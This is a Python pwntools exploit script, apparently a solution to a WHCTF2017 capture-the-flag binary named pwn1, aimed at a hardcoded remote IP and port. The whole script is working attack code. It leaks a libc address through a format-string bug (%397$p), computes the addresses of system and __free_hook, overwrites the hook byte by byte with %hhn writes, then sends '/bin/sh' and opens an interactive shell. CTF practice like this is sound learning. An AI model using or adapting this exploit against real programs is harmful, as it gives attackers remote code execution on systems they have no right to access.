# -*- coding: utf-8 -*-
from pwn import *

#context(log_level='debug')

p = remote("111.198.29.45", 55144)
#p = process("./pwn1")
elf = ELF("./pwn1")
libc = ELF("./libc.so.6")


def one(payload):
    p.recvuntil("Code:\n")
    p.sendline("1")
    p.recvuntil("Welcome To WHCTF2017:\n")
    p.sendline(payload)

#gdb.attach(p)
payload = 0x3e8 * "a" + "xx%397$p"
one(payload)
p.recvuntil("0x")
addr = int(p.recvuntil('\n')[:-1],16)
libc_base = addr - libc.symbols["__libc_start_main"] - 240
log.success("libc_base:"+hex(libc_base))
system_addr = libc_base + libc.symbols["system"]
freehook = libc_base + libc.symbols["__free_hook"]
log.success("freehook:"+hex(freehook))

for i in range(8):
    payload = "a"*0x3e8
    payload+= "xx%"+str(0x100-0xfe+ord(p64(system_addr)[i]))+'c%133$hhn'
    payload = payload.ljust(0x3f8,"a")
    payload+= p64(freehook+i)
    payload = payload.ljust(0x400,"a")
    one(payload)

p.sendline("2")
p.sendline("/bin/sh")

p.interactive()
